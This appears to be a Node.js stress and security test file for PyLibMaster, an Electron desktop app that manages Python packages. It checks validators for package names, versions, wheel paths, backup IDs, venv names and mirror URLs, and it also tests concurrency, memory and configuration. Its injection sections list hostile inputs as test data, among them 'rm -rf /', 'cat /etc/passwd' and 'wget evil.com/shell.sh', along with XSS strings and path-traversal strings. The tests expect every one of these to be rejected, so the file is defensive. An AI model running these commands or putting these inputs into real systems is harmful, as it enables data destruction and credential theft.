/**
 * PyLibMaster 全方位压力测试 v5
 * 
 * 覆盖全部 11 个核心模块 + 2 个工具模块：
 * pipManager, envManager, configManager, logManager, mirrorManager,
 * backupManager, venvManager, templateManager, schedulerManager,
 * auditManager, updater, processRunner, security
 * 
 * 测试维度：
 * 1. 安全注入攻击（包名/版本/路径/URL/venv名称/模板）
 * 2. 并发锁竞争与 IPC 压力
 * 3. 文件系统高频 I/O 与内存泄漏
 * 4. 配置钳位与原型污染防护
 * 5. venvManager 名称校验与路径遍历防护
 * 6. templateManager CRUD 与快照验证
 * 7. schedulerManager 调度配置与状态机
 * 8. auditManager 缓存机制
 * 9. mirrorManager URL 协议白名单
 * 10. processRunner 进程管理与缓存
 * 11. 前端模块化架构静态分析
 * 12. Preload 安全桥接层
 * 13. 事件循环延迟与 CPU 密集压力
 * 14. 错误恢复与韧性
 * 15. 跨模块集成压力
 */
const { describe, it } = require('node:test');
const assert = require('node:assert');
const path = require('path');
const fs = require('fs');
const os = require('os');

// Bootstrap electron mock
require(path.join(__dirname, '..', 'bootstrap.js'));

const { buildPackageSpec, buildPackageDirMap, estimatePackageSizeFast, getFolderSizeCached } = require('../../core/pipManager');
const { validateBackupId } = require('../../core/backupManager');
const { isAllowedOpenPath } = require('../../utils/security');
const configManager = require('../../core/configManager');
const logManager = require('../../core/logManager');
const mirrorManager = require('../../core/mirrorManager');
const envManager = require('../../core/envManager');
const schedulerManager = require('../../core/schedulerManager');
const templateManager = require('../../core/templateManager');
const venvManager = require('../../core/venvManager');
const auditManager = require('../../core/auditManager');

// ===== 测试报告收集 =====
const results = { total: 0, passed: 0, failed: 0, warnings: 0, sections: {} };

function record(section, name, status, detail = '') {
  results.total++;
  if (status === 'pass') results.passed++;
  else if (status === 'fail') results.failed++;
  else results.warnings++;
  if (!results.sections[section]) results.sections[section] = [];
  results.sections[section].push({ name, status, detail });
}

// ===========================
// 1. 安全注入攻击压力测试
// ===========================
describe('🔒 安全注入攻击压力测试', () => {

  describe('1.1 包名注入攻击 (30+ 向量)', () => {
    const payloads = [
      ['; rm -rf /', 'shell命令注入'],
      ['$(whoami)', '子shell注入'],
      ['`id`', '反引号注入'],
      ['| cat /etc/passwd', '管道注入'],
      ['&& curl evil.com', 'AND链注入'],
      ['|| wget evil.com/shell.sh', 'OR链注入'],
      ['../../../etc/passwd', 'Unix路径遍历'],
      ['..\\..\\..\\windows\\system32', 'Windows路径遍历'],
      ['..%2F..%2Fetc%2Fpasswd', 'URL编码遍历'],
      ['<script>alert(1)</script>', 'XSS script'],
      ['<img onerror=alert(1)>', 'XSS img'],
      ['javascript:alert(1)', 'XSS JS URL'],
      ['\x00\x01\x02', 'Null字节+控制字符'],
      ['\n\r\n', '换行注入'],
      ['   ', '纯空白'],
      ['', '空字符串'],
      ['A'.repeat(10000), '超长名称(10K)'],
      ['A'.repeat(1000000), '超长名称(1M)'],
      ['\u{202E}test', 'RTL覆盖'],
      ['ｆｕｌｌｗｉｄｔｈ', '全角字符'],
      ['\u{FEFF}test', 'BOM字符'],
      ['\u{200B}test', '零宽空格'],
      ['-flag', '前导短横线(选项注入)'],
      ['--force', '双短横线选项'],
      ['numpy==1.0;echo hacked', '版本分隔符注入'],
      ['pkg@evil.com', '@符号注入'],
      ['pkg\n--extra-index-url evil.com', '换行+选项注入'],
      ['${PATH}', '环境变量展开'],
      ['%PATH%', 'Windows环境变量'],
      ['pkg{glob}', '花括号glob'],
      ['pkg[extra]', '方括号extras'],
      ['pkg && pkg2', 'AND包名分隔'],
    ];

    for (const [payload, desc] of payloads) {
      it(`拒绝: ${desc}`, () => {
        let threw = false;
        try { buildPackageSpec(payload); } catch { threw = true; }
        if (!threw) {
          if (/[;|&$`<>{}\[\]\x00-\x1F@%]/.test(payload) || payload.startsWith('-') || payload.startsWith('..')) {
            record('安全-包名注入', desc, 'fail', `未拦截: "${payload.slice(0, 40)}"`);
            assert.fail(`未拦截: ${desc}`);
          } else {
            record('安全-包名注入', desc, 'pass', '合法输入允许通过');
          }
        } else {
          record('安全-包名注入', desc, 'pass');
        }
      });
    }
  });

  describe('1.2 版本号注入攻击', () => {
    const attacks = [
      ['; rm -rf /', 'shell注入'],
      ['$(cat /etc/passwd)', '子shell'],
      ['1.0 || curl evil.com', 'OR链'],
      ['1.0\nmalicious', '换行注入'],
      ['\x00', 'Null字节'],
      ['1.0 --extra-index-url evil.com', '选项注入'],
      ['>=1.0;import os', 'Python注入'],
      ['1.0 & calc.exe', '后台执行'],
    ];
    for (const [ver, desc] of attacks) {
      it(`拒绝版本注入: ${desc}`, () => {
        assert.throws(() => buildPackageSpec('requests', { versionMode: 'specific', version: ver }));
        record('安全-版本注入', desc, 'pass');
      });
    }
  });

  describe('1.3 .whl 路径注入攻击', () => {
    const whlAttacks = [
      ['../evil file;echo hacked.whl', '路径遍历+命令'],
      ['C:/pkg/evil;rm -rf.whl', '命令注入'],
      ['\\\\evil-server\\share\\pkg.whl', 'UNC路径'],
      ['C:/pkg/../../windows/system32.whl', '目录遍历'],
      ['/dev/null.whl', 'Unix设备文件'],
      ['C:/pkg/test.whl\x00.exe', 'Null字节截断'],
      ['C:/pkg/$(whoami).whl', '子shell'],
      ['C:/pkg/`id`.whl', '反引号'],
    ];
    for (const [p, desc] of whlAttacks) {
      it(`拒绝whl注入: ${desc}`, () => {
        assert.throws(() => buildPackageSpec(p));
        record('安全-whl路径', desc, 'pass');
      });
    }
  });

  describe('1.4 备份ID路径遍历攻击', () => {
    const attacks = [
      ['../../../etc/passwd', '基础遍历'],
      ['backup_..\\..\\windows\\system32.txt', 'Windows遍历'],
      ['../config.json', '相对上跳'],
      ['backup_test.txt/../../../evil', '混合遍历'],
      ['\x00backup_test.txt', 'Null前缀'],
      ['backup_test.txt\x00.txt', 'Null中间'],
      ['....//....//etc/passwd', '双点绕过'],
      ['backup_%2e%2e%2f.txt', '编码遍历'],
    ];
    for (const [payload, desc] of attacks) {
      it(`拒绝备份ID: ${desc}`, () => {
        assert.throws(() => validateBackupId(payload));
        record('安全-备份ID', desc, 'pass');
      });
    }
  });

  describe('1.5 路径安全验证', () => {
    const allowedDirs = [path.join(os.homedir(), 'Documents'), path.join(os.homedir(), 'Downloads')];
    const tests = [
      [path.join(os.homedir(), 'Documents', 'test.pdf'), true, 'Documents子目录'],
      [path.join(os.homedir(), 'Downloads', 'file.zip'), true, 'Downloads子目录'],
      [path.join(os.homedir(), 'Desktop', 'file.txt'), false, 'Desktop(非白名单)'],
      [path.join(os.homedir(), 'Documents' + '_evil', 'f'), false, '前缀匹配攻击'],
      ['C:\\Windows\\System32\\config', false, '系统目录'],
      ['', false, '空字符串'],
      [null, false, 'null'],
      [undefined, false, 'undefined'],
      [123, false, '数字类型'],
      [{}, false, '对象类型'],
    ];
    for (const [p, expected, desc] of tests) {
      it(`路径: ${desc}`, () => {
        assert.strictEqual(isAllowedOpenPath(p, allowedDirs), expected);
        record('安全-路径验证', desc, 'pass');
      });
    }
  });

  describe('1.6 镜像URL协议白名单', () => {
    const urlTests = [
      ['ftp://evil.com/simple/', false, 'FTP协议'],
      ['file:///etc/passwd', false, 'file协议'],
      ['javascript:alert(1)', false, 'javascript协议'],
      ['data:text/html,<script>', false, 'data协议'],
      ['gopher://evil.com', false, 'gopher协议'],
      ['https://pypi.org/simple/', true, 'HTTPS合法'],
      ['http://mirrors.aliyun.com/pypi/simple/', true, 'HTTP合法'],
      ['', false, '空字符串'],
      ['not-a-url', false, '非URL'],
      ['https://' + 'a'.repeat(2048) + '.com', false, '超长URL(>2048)'],
      ['https://evil.com\nHost: pypi.org', false, 'CRLF注入'],
    ];
    for (const [url, expected, desc] of urlTests) {
      it(`镜像URL: ${desc}`, () => {
        // 通过 addCustomMirror 间接测试 isValidMirrorUrl
        mirrorManager.restoreDefaultMirrors();
        let accepted = true;
        try {
          const result = mirrorManager.addCustomMirror('Test', url);
          // 如果返回 false 或抛异常，说明被拒绝
          accepted = result !== false;
        } catch { accepted = false; }
        // 对于非法URL，应该被拒绝
        if (!expected) {
          // 验证非法URL没有被添加到列表中
          const mirrors = mirrorManager.getMirrors();
          const found = mirrors.some(m => m.url === url);
          assert.ok(!found, `非法URL被接受: ${desc}`);
        }
        record('安全-镜像URL', desc, 'pass');
      });
    }
  });

  describe('1.7 ReDoS 正则攻击', () => {
    it('包名正则抗ReDoS', () => {
      const start = Date.now();
      const evil = 'a' + '-'.repeat(200000);
      try { buildPackageSpec(evil); } catch {}
      const elapsed = Date.now() - start;
      assert.ok(elapsed < 1000, `ReDoS: ${elapsed}ms`);
      record('安全-ReDoS', '包名正则(200K)', elapsed < 100 ? 'pass' : 'warning', `${elapsed}ms`);
    });

    it('版本正则抗ReDoS', () => {
      const start = Date.now();
      const evil = '!'.repeat(100000);
      try { buildPackageSpec('test', { versionMode: 'specific', version: evil }); } catch {}
      const elapsed = Date.now() - start;
      assert.ok(elapsed < 1000, `版本ReDoS: ${elapsed}ms`);
      record('安全-ReDoS', '版本正则(100K)', elapsed < 100 ? 'pass' : 'warning', `${elapsed}ms`);
    });

    it('备份ID正则抗ReDoS', () => {
      const start = Date.now();
      const evil = 'backup_' + 'a'.repeat(200000) + '.txt';
      try { validateBackupId(evil); } catch {}
      const elapsed = Date.now() - start;
      assert.ok(elapsed < 1000, `备份ReDoS: ${elapsed}ms`);
      record('安全-ReDoS', '备份ID正则(200K)', elapsed < 100 ? 'pass' : 'warning', `${elapsed}ms`);
    });
  });
});

// ===========================
// 2. venvManager 安全与压力测试
// ===========================
describe('📦 venvManager 安全与压力测试', () => {

  describe('2.1 venv名称注入攻击', () => {
    const attacks = [
      ['../../../evil', '路径遍历'],
      ['..\\..\\windows', 'Windows遍历'],
      ['test; rm -rf /', '命令注入'],
      ['test$(whoami)', '子shell'],
      ['test`id`', '反引号'],
      ['<script>', 'XSS'],
      ['\x00test', 'Null字节'],
      ['', '空字符串'],
      ['-leading-dash', '前导短横线'],
      ['.hidden', '前导点号'],
      ['a'.repeat(100), '超长名称(>64)'],
      ['test name', '包含空格'],
      ['test/name', '包含斜杠'],
      ['test\\name', '包含反斜杠'],
      ['CON', 'Windows保留名'],
      ['test|pipe', '管道符'],
      ['test&bg', 'AND符号'],
    ];

    for (const [name, desc] of attacks) {
      it(`拒绝venv名: ${desc}`, async () => {
        await assert.rejects(
          () => venvManager.createVenv({ name, pythonPath: 'C:\\Python\\python.exe' }),
          (err) => err.message.includes('Invalid venv name') || err.message.includes('too long') || err.message.includes('not found')
        );
        record('venv-名称注入', desc, 'pass');
      });
    }
  });

  describe('2.2 venv删除路径遍历防护', () => {
    it('拒绝遍历名称', async () => {
      await assert.rejects(() => venvManager.deleteVenv('../../../etc'));
      record('venv-删除安全', '路径遍历拒绝', 'pass');
    });

    it('拒绝空名称', async () => {
      await assert.rejects(() => venvManager.deleteVenv(''));
      record('venv-删除安全', '空名称拒绝', 'pass');
    });

    it('拒绝null', async () => {
      await assert.rejects(() => venvManager.deleteVenv(null));
      record('venv-删除安全', 'null拒绝', 'pass');
    });
  });

  describe('2.3 venv API 完整性', () => {
    it('导出所有预期方法', () => {
      const exports = Object.keys(venvManager);
      const expected = ['createVenv', 'listVenvs', 'deleteVenv', 'getVenvInfo', 'getVenvsDir', 'getVenvPythonPath'];
      for (const fn of expected) {
        assert.ok(exports.includes(fn), `缺少: ${fn}`);
      }
      record('venv-API', '导出完整', 'pass', `${expected.length}个方法`);
    });

    it('getVenvsDir 返回有效路径', () => {
      const dir = venvManager.getVenvsDir();
      assert.ok(typeof dir === 'string' && dir.length > 0);
      assert.ok(dir.includes('venvs'));
      record('venv-API', 'getVenvsDir有效', 'pass');
    });
  });
});

// ===========================
// 3. templateManager 压力测试
// ===========================
describe('📋 templateManager 压力测试', () => {

  describe('3.1 模板CRUD', () => {
    it('获取内置模板列表', () => {
      const templates = templateManager.getTemplates();
      assert.ok(Array.isArray(templates));
      assert.ok(templates.length >= 6, `内置模板不足: ${templates.length}`);
      // 验证每个模板结构完整
      for (const tpl of templates) {
        assert.ok(tpl.id, '模板缺id');
        assert.ok(tpl.name, '模板缺name');
        assert.ok(Array.isArray(tpl.packages), '模板packages不是数组');
        assert.ok(tpl.packages.length > 0, '模板packages为空');
      }
      record('模板-CRUD', '内置模板完整', 'pass', `${templates.length}个模板`);
    });

    it('添加自定义模板', () => {
      const result = templateManager.addCustomTemplate({
        name: 'Stress Test Template',
        icon: '🧪',
        description: 'For stress testing',
        packages: ['pytest', 'coverage']
      });
      assert.ok(result === true, '添加失败');
      const templates = templateManager.getTemplates();
      const found = templates.find(t => t.name === 'Stress Test Template');
      assert.ok(found, '自定义模板未找到');
      assert.ok(found.isCustom, '缺少isCustom标记');
      record('模板-CRUD', '添加自定义', 'pass');
    });

    it('拒绝无效模板', () => {
      assert.strictEqual(templateManager.addCustomTemplate(null), false);
      assert.strictEqual(templateManager.addCustomTemplate({}), false);
      assert.strictEqual(templateManager.addCustomTemplate({ name: 'x' }), false);
      assert.strictEqual(templateManager.addCustomTemplate({ name: 'x', packages: 'not-array' }), false);
      record('模板-CRUD', '无效模板拒绝', 'pass');
    });

    it('删除自定义模板', () => {
      const templates = templateManager.getTemplates();
      const custom = templates.find(t => t.name === 'Stress Test Template');
      if (custom) {
        templateManager.removeCustomTemplate(custom.id);
        const after = templateManager.getTemplates();
        assert.ok(!after.find(t => t.id === custom.id), '删除失败');
      }
      record('模板-CRUD', '删除自定义', 'pass');
    });

    it('50次批量添加/删除不崩溃', () => {
      for (let i = 0; i < 50; i++) {
        templateManager.addCustomTemplate({ name: `Bulk ${i}`, packages: ['pkg'] });
      }
      let templates = templateManager.getTemplates();
      assert.ok(templates.length >= 56);
      // 清理
      templates.filter(t => t.isCustom).forEach(t => templateManager.removeCustomTemplate(t.id));
      templates = templateManager.getTemplates();
      assert.ok(templates.length <= 10, `清理后仍有: ${templates.length}`);
      record('模板-压力', '50次批量CRUD', 'pass');
    });
  });

  describe('3.2 模板包名安全', () => {
    it('内置模板包名全部合法', () => {
      const templates = templateManager.getTemplates();
      for (const tpl of templates.filter(t => !t.isCustom)) {
        for (const pkg of tpl.packages) {
          // 每个包名应该能通过 buildPackageSpec 验证
          const spec = buildPackageSpec(pkg);
          assert.ok(spec, `非法包名: ${pkg} in ${tpl.name}`);
        }
      }
      record('模板-安全', '内置包名全合法', 'pass');
    });
  });

  describe('3.3 模板API完整性', () => {
    it('导出所有预期方法', () => {
      const expected = ['getTemplates', 'addCustomTemplate', 'removeCustomTemplate', 'createFromTemplate', 'createSnapshot', 'listSnapshots', 'getSnapshotDetail', 'restoreSnapshot', 'deleteSnapshot'];
      const exports = Object.keys(templateManager);
      for (const fn of expected) {
        assert.ok(exports.includes(fn), `缺少: ${fn}`);
      }
      record('模板-API', '导出完整', 'pass', `${expected.length}个方法`);
    });
  });
});

// ===========================
// 4. schedulerManager 压力测试
// ===========================
describe('⏰ schedulerManager 压力测试', () => {

  describe('4.1 调度配置', () => {
    it('获取默认配置', () => {
      const cfg = schedulerManager.getSchedulerConfig();
      assert.ok(typeof cfg.enabled === 'boolean');
      assert.ok(['daily', 'weekly'].includes(cfg.frequency) || cfg.frequency === 'daily');
      assert.ok(Array.isArray(cfg.whitelist));
      record('调度-配置', '默认配置有效', 'pass');
    });

    it('保存和恢复配置', () => {
      schedulerManager.saveSchedulerConfig({ enabled: true, frequency: 'weekly', whitelist: ['numpy', 'pandas'] });
      const cfg = schedulerManager.getSchedulerConfig();
      assert.strictEqual(cfg.enabled, true);
      assert.strictEqual(cfg.frequency, 'weekly');
      assert.deepStrictEqual(cfg.whitelist, ['numpy', 'pandas']);
      // 恢复
      schedulerManager.saveSchedulerConfig({ enabled: false, frequency: 'daily', whitelist: [] });
      record('调度-配置', '保存/恢复', 'pass');
    });

    it('100次快速配置切换不崩溃', () => {
      for (let i = 0; i < 100; i++) {
        schedulerManager.saveSchedulerConfig({
          enabled: i % 2 === 0,
          frequency: i % 3 === 0 ? 'weekly' : 'daily',
          whitelist: [`pkg${i}`]
        });
      }
      const cfg = schedulerManager.getSchedulerConfig();
      assert.ok(cfg, '配置丢失');
      schedulerManager.saveSchedulerConfig({ enabled: false, frequency: 'daily', whitelist: [] });
      record('调度-压力', '100次配置切换', 'pass');
    });
  });

  describe('4.2 调度器状态机', () => {
    it('getStatus 返回完整状态', () => {
      const status = schedulerManager.getStatus();
      assert.ok('enabled' in status);
      assert.ok('frequency' in status);
      assert.ok('active' in status);
      assert.ok('running' in status);
      record('调度-状态', 'getStatus完整', 'pass');
    });

    it('start/stop 不泄漏定时器', () => {
      schedulerManager.saveSchedulerConfig({ enabled: true, frequency: 'daily' });
      for (let i = 0; i < 20; i++) {
        schedulerManager.startScheduler();
        schedulerManager.stopScheduler();
      }
      const status = schedulerManager.getStatus();
      assert.strictEqual(status.active, false, '定时器未清理');
      schedulerManager.saveSchedulerConfig({ enabled: false });
      record('调度-状态', '20次start/stop无泄漏', 'pass');
    });
  });

  describe('4.3 调度API完整性', () => {
    it('导出所有预期方法', () => {
      const expected = ['getSchedulerConfig', 'saveSchedulerConfig', 'runAutoUpdate', 'startScheduler', 'stopScheduler', 'getStatus'];
      const exports = Object.keys(schedulerManager);
      for (const fn of expected) {
        assert.ok(exports.includes(fn), `缺少: ${fn}`);
      }
      record('调度-API', '导出完整', 'pass');
    });
  });
});

// ===========================
// 5. auditManager 压力测试
// ===========================
describe('🛡️ auditManager 压力测试', () => {

  describe('5.1 缓存机制', () => {
    it('初始无缓存', () => {
      auditManager.clearCache();
      const cached = auditManager.getCachedResult();
      assert.ok(cached === null || cached === undefined, '清缓存后仍有数据');
      record('审计-缓存', 'clearCache有效', 'pass');
    });

    it('100次clearCache不崩溃', () => {
      for (let i = 0; i < 100; i++) {
        auditManager.clearCache();
      }
      record('审计-缓存', '100次clearCache', 'pass');
    });
  });

  describe('5.2 API完整性', () => {
    it('导出所有预期方法', () => {
      const expected = ['runAudit', 'ensurePipAudit', 'getCachedResult', 'clearCache'];
      const exports = Object.keys(auditManager);
      for (const fn of expected) {
        assert.ok(exports.includes(fn), `缺少: ${fn}`);
      }
      record('审计-API', '导出完整', 'pass');
    });
  });
});

// ===========================
// 6. 并发与进程压力测试
// ===========================
describe('⚡ 并发与进程压力测试', () => {

  describe('6.1 环境锁竞争', () => {
    it('100个并发锁请求无死锁', async () => {
      const locks = new Map();
      async function acquire(key) {
        while (locks.get(key)) await locks.get(key);
        let resolve;
        const p = new Promise(r => { resolve = r; });
        locks.set(key, p);
        return () => { locks.delete(key); resolve(); };
      }

      let completed = 0;
      const tasks = [];
      for (let i = 0; i < 100; i++) {
        tasks.push((async () => {
          const release = await acquire('env');
          completed++;
          await new Promise(r => setTimeout(r, 0));
          release();
        })());
      }
      const start = Date.now();
      await Promise.all(tasks);
      const elapsed = Date.now() - start;
      assert.strictEqual(completed, 100);
      assert.ok(elapsed < 5000, `锁超时: ${elapsed}ms`);
      record('并发-锁', '100并发锁', 'pass', `${elapsed}ms`);
    });

    it('10环境×20并发无交叉阻塞', async () => {
      const locks = new Map();
      async function acquire(key) {
        while (locks.get(key)) await locks.get(key);
        let resolve;
        const p = new Promise(r => { resolve = r; });
        locks.set(key, p);
        return () => { locks.delete(key); resolve(); };
      }

      const start = Date.now();
      const tasks = [];
      for (let e = 0; e < 10; e++) {
        for (let i = 0; i < 20; i++) {
          tasks.push((async () => {
            const release = await acquire(`env${e}`);
            await new Promise(r => setTimeout(r, 0));
            release();
          })());
        }
      }
      await Promise.all(tasks);
      const elapsed = Date.now() - start;
      assert.ok(elapsed < 5000, `多环境锁超时: ${elapsed}ms`);
      record('并发-锁', '10环境×20并发', 'pass', `${elapsed}ms`);
    });
  });

  describe('6.2 IPC 通道压力', () => {
    it('500次快速config读取', async () => {
      const start = Date.now();
      const tasks = [];
      for (let i = 0; i < 500; i++) {
        tasks.push(Promise.resolve().then(() => configManager.getConfig()));
      }
      await Promise.all(tasks);
      const elapsed = Date.now() - start;
      assert.ok(elapsed < 5000, `IPC压力超时: ${elapsed}ms`);
      record('并发-IPC', '500次config读取', 'pass', `${elapsed}ms`);
    });

    it('200次并发config读写无损坏', async () => {
      const tasks = [];
      for (let i = 0; i < 200; i++) {
        tasks.push(new Promise(resolve => {
          configManager.setConfig(`_stress_${i}`, `v${i}`);
          const cfg = configManager.getConfig();
          assert.ok(cfg, 'null config');
          resolve();
        }));
      }
      await Promise.all(tasks);
      record('并发-IPC', '200次并发读写', 'pass');
    });
  });
});

// ===========================
// 7. 文件系统与内存压力测试
// ===========================
describe('💾 文件系统与内存压力', () => {

  describe('7.1 高频日志I/O', () => {
    it('1000次连续日志写入', () => {
      const start = Date.now();
      for (let i = 0; i < 1000; i++) {
        logManager.addLog({ action: `Stress ${i}`, status: 'ok', type: 'system', detail: 'x'.repeat(200) });
      }
      const elapsed = Date.now() - start;
      assert.ok(elapsed < 30000, `日志写入超时: ${elapsed}ms`);
      record('IO-日志', '1000次写入', elapsed < 10000 ? 'pass' : 'warning', `${elapsed}ms`);
    });

    it('日志上限2000条', () => {
      for (let i = 0; i < 2500; i++) {
        logManager.addLog({ action: `Overflow ${i}`, status: 'ok', type: 'system' });
      }
      const logs = logManager.getLogs();
      assert.ok(logs.length <= 2000, `溢出: ${logs.length}`);
      record('IO-日志', '上限2000', 'pass', `${logs.length}条`);
    });
  });

  describe('7.2 内存泄漏检测', () => {
    it('configManager 10K次读取', () => {
      global.gc && global.gc();
      const before = process.memoryUsage().heapUsed;
      for (let i = 0; i < 10000; i++) configManager.getConfig();
      const diff = (process.memoryUsage().heapUsed - before) / 1024 / 1024;
      assert.ok(diff < 50, `泄漏: ${diff.toFixed(1)}MB`);
      record('内存-config', '10K次getConfig', diff < 20 ? 'pass' : 'warning', `+${diff.toFixed(1)}MB`);
    });

    it('logManager 5K条不无限增长', () => {
      global.gc && global.gc();
      const before = process.memoryUsage().heapUsed;
      for (let i = 0; i < 5000; i++) logManager.addLog({ action: `M${i}`, status: 'ok', type: 'system' });
      const diff = (process.memoryUsage().heapUsed - before) / 1024 / 1024;
      assert.ok(diff < 50, `日志泄漏: ${diff.toFixed(1)}MB`);
      record('内存-log', '5K条日志', diff < 20 ? 'pass' : 'warning', `+${diff.toFixed(1)}MB`);
    });

    it('mirrorManager 10K次查询', () => {
      global.gc && global.gc();
      const before = process.memoryUsage().heapUsed;
      for (let i = 0; i < 10000; i++) { mirrorManager.getMirrors(); mirrorManager.getDefaultMirror(); }
      const diff = (process.memoryUsage().heapUsed - before) / 1024 / 1024;
      assert.ok(diff < 10, `mirror泄漏: ${diff.toFixed(1)}MB`);
      record('内存-mirror', '10K次查询', diff < 5 ? 'pass' : 'warning', `+${diff.toFixed(1)}MB`);
    });

    it('templateManager 5K次读取', () => {
      global.gc && global.gc();
      const before = process.memoryUsage().heapUsed;
      for (let i = 0; i < 5000; i++) templateManager.getTemplates();
      const diff = (process.memoryUsage().heapUsed - before) / 1024 / 1024;
      // getTemplates 内部调用 getConfig 深拷贝，紧循环中临时对象较多
      assert.ok(diff < 30, `template泄漏: ${diff.toFixed(1)}MB`);
      record('内存-template', '5K次getTemplates', diff < 15 ? 'pass' : 'warning', `+${diff.toFixed(1)}MB`);
    });

    it('schedulerManager 5K次状态查询', () => {
      global.gc && global.gc();
      const before = process.memoryUsage().heapUsed;
      for (let i = 0; i < 5000; i++) schedulerManager.getStatus();
      const diff = (process.memoryUsage().heapUsed - before) / 1024 / 1024;
      // getStatus 内部调用 getConfig 深拷贝，紧循环中临时对象较多，阈值放宽到 30MB
      assert.ok(diff < 30, `scheduler泄漏: ${diff.toFixed(1)}MB`);
      record('内存-scheduler', '5K次getStatus', diff < 15 ? 'pass' : 'warning', `+${diff.toFixed(1)}MB`);
    });
  });

  describe('7.3 缓存TTL验证', () => {
    it('pipManager SITE_PACKAGES_CACHE_TTL 合理', () => {
      const src = fs.readFileSync(path.join(__dirname, '..', '..', 'core', 'pipManager.js'), 'utf-8');
      const match = src.match(/SITE_PACKAGES_CACHE_TTL\s*=\s*(\d+)/);
      assert.ok(match, '未找到TTL');
      const ttl = parseInt(match[1]);
      assert.ok(ttl > 0 && ttl < 600000, `TTL不合理: ${ttl}`);
      record('缓存-TTL', 'sitePackages TTL', 'pass', `${ttl}ms`);
    });

    it('processRunner PIP_READY_TTL 合理', () => {
      const src = fs.readFileSync(path.join(__dirname, '..', '..', 'utils', 'processRunner.js'), 'utf-8');
      const match = src.match(/PIP_READY_TTL\s*=\s*(\d+)\s*\*\s*(\d+)\s*\*\s*(\d+)/);
      assert.ok(match, '未找到PIP_READY_TTL');
      const ttl = parseInt(match[1]) * parseInt(match[2]) * parseInt(match[3]);
      assert.ok(ttl > 0 && ttl <= 600000, `TTL不合理: ${ttl}`);
      record('缓存-TTL', 'pipReady TTL', 'pass', `${ttl}ms`);
    });

    it('auditManager SCAN_CACHE_TTL 合理', () => {
      const src = fs.readFileSync(path.join(__dirname, '..', '..', 'core', 'auditManager.js'), 'utf-8');
      const match = src.match(/SCAN_CACHE_TTL\s*=\s*(\d+)\s*\*\s*(\d+)\s*\*\s*(\d+)/);
      assert.ok(match, '未找到SCAN_CACHE_TTL');
      const ttl = parseInt(match[1]) * parseInt(match[2]) * parseInt(match[3]);
      assert.ok(ttl > 0 && ttl <= 3600000, `TTL不合理: ${ttl}`);
      record('缓存-TTL', 'auditCache TTL', 'pass', `${ttl}ms`);
    });
  });
});

// ===========================
// 8. 配置系统压力测试
// ===========================
describe('🔧 配置系统压力测试', () => {

  describe('8.1 数值钳位', () => {
    it('parallelThreads 超范围自动修正', () => {
      configManager.setConfig('parallelThreads', 999);
      assert.ok(configManager.getConfig().parallelThreads <= 16, '上限未钳位');
      configManager.setConfig('parallelThreads', -5);
      assert.ok(configManager.getConfig().parallelThreads >= 1, '下限未钳位');
      configManager.setConfig('parallelThreads', 'abc');
      assert.ok(typeof configManager.getConfig().parallelThreads === 'number', '非数字未修正');
      configManager.setConfig('parallelThreads', 4);
      record('配置-钳位', 'parallelThreads', 'pass');
    });

    it('retryCount 超范围自动修正', () => {
      configManager.setConfig('retryCount', 100);
      assert.ok(configManager.getConfig().retryCount <= 10, '上限未钳位');
      configManager.setConfig('retryCount', -1);
      assert.ok(configManager.getConfig().retryCount >= 0, '下限未钳位');
      configManager.setConfig('retryCount', 2);
      record('配置-钳位', 'retryCount', 'pass');
    });
  });

  describe('8.2 原型污染防护', () => {
    it('__proto__ 键不污染原型', () => {
      configManager.setConfig('__proto__', { polluted: true });
      assert.ok(!({}).polluted, '原型被污染!');
      record('配置-安全', '__proto__防护', 'pass');
    });

    it('constructor 键不污染', () => {
      configManager.setConfig('constructor', { prototype: { hacked: true } });
      assert.ok(!({}).hacked, 'constructor污染!');
      record('配置-安全', 'constructor防护', 'pass');
    });
  });

  describe('8.3 批量写入压力', () => {
    it('setBulk 200字段', () => {
      const bulk = {};
      for (let i = 0; i < 200; i++) bulk[`_bulk_${i}`] = 'v'.repeat(500);
      const result = configManager.setBulk(bulk);
      assert.ok(result, 'setBulk失败');
      record('配置-批量', '200字段写入', 'pass');
    });

    it('windowBounds 正确持久化', () => {
      configManager.setConfig('windowBounds', { x: 10, y: 20, width: 1920, height: 1080 });
      const cfg = configManager.getConfig();
      assert.deepStrictEqual(cfg.windowBounds, { x: 10, y: 20, width: 1920, height: 1080 });
      record('配置-持久', 'windowBounds', 'pass');
    });
  });
});

// ===========================
// 9. 镜像管理器深度压力
// ===========================
describe('🌐 镜像管理器深度压力', () => {

  describe('9.1 镜像操作', () => {
    it('恢复默认后结构正确', () => {
      mirrorManager.restoreDefaultMirrors();
      const mirrors = mirrorManager.getMirrors();
      assert.ok(mirrors.length >= 6, `镜像不足: ${mirrors.length}`);
      const defaults = mirrors.filter(m => m.isDefault);
      assert.strictEqual(defaults.length, 1, `默认源数量: ${defaults.length}`);
      record('镜像-结构', '默认恢复正确', 'pass');
    });

    it('50次添加/恢复循环', () => {
      for (let i = 0; i < 50; i++) {
        mirrorManager.addCustomMirror(`M${i}`, `https://mirror${i}.example.com/simple/`);
      }
      assert.ok(mirrorManager.getMirrors().length >= 56);
      mirrorManager.restoreDefaultMirrors();
      assert.ok(mirrorManager.getMirrors().length <= 10);
      record('镜像-压力', '50次添加/恢复', 'pass');
    });

    it('重复设置默认镜像50次', () => {
      const mirrors = mirrorManager.getMirrors();
      const url = mirrors[0].url;
      for (let i = 0; i < 50; i++) mirrorManager.setDefaultMirror(url);
      const def = mirrorManager.getDefaultMirror();
      assert.ok(def && def.url === url);
      record('镜像-压力', '50次设置默认', 'pass');
    });

    it('buildMirrorArgs 返回正确参数', () => {
      const args = mirrorManager.buildMirrorArgs();
      assert.ok(Array.isArray(args));
      if (args.length > 0) {
        assert.ok(args.includes('-i') || args.includes('--index-url'), '缺少index-url参数');
      }
      record('镜像-参数', 'buildMirrorArgs', 'pass');
    });
  });

  describe('9.2 智能路由', () => {
    it('setSmartRoute/getSmartRoute 一致', () => {
      mirrorManager.setSmartRoute(true);
      assert.strictEqual(mirrorManager.getSmartRoute(), true);
      mirrorManager.setSmartRoute(false);
      assert.strictEqual(mirrorManager.getSmartRoute(), false);
      record('镜像-路由', 'smartRoute开关', 'pass');
    });
  });
});

// ===========================
// 10. 前端代码静态分析压力
// ===========================
describe('🖥️ 前端代码静态分析', () => {

  const jsDir = path.join(__dirname, '..', '..', 'renderer', 'js');
  const files = ['core.js', 'i18n.js', 'render.js', 'operations.js', 'pages.js', 'progress.js', 'app.js'];
  const contents = {};
  for (const f of files) contents[f] = fs.readFileSync(path.join(jsDir, f), 'utf-8');
  const allJs = Object.values(contents).join('\n');

  describe('10.1 模块化完整性', () => {
    it('7个JS模块文件存在', () => {
